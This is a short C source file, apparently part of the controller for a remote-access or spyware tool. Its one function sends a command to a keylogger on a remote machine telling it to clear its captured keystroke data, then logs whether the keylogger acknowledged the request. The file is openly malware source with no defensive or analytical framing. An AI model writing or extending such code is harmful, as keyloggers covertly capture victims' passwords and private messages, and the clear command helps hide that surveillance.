#include <stdlib.h>
#include "types.h"
#include "logger.h"
#include "cmd/commands.h"
#include "net/interface.h"
#include "net/error.h"

int command_Keylogger_Clear(void)
{
	if(net_SendCmd((uint8*)" ", 1, COMMANDS_KEYLOGGER_CLEAR) == NET_LOST_CONNECTION)
	{
		LOG(LOG_ERR, "Failed to send!\n");

		return NET_LOST_CONNECTION;
	}

	uint8* rmsg;
	
	int rv = net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES);

	if(rv == NET_LOST_CONNECTION)
	{
		LOG(LOG_ERR, "Failed to receive!\n");
		free(rmsg);

		return NET_LOST_CONNECTION;

	}else if(rv == NET_TIMED_OUT){
		LOG(LOG_ERR, "Time out!\n");
		free(rmsg);

		return NET_LOST_CONNECTION;
	}

	if(rmsg[0] == COMMANDS_DISAPPROVE)
	{
		LOG(LOG_ERR, "The keylogger may not be running ?\n");
	}else if(rmsg[0] == COMMANDS_APPROVE){
		LOG(LOG_SUCC, "Keylogger data is cleared!\n");
	}

	free(rmsg);

	return COMMANDS_SUCC;
}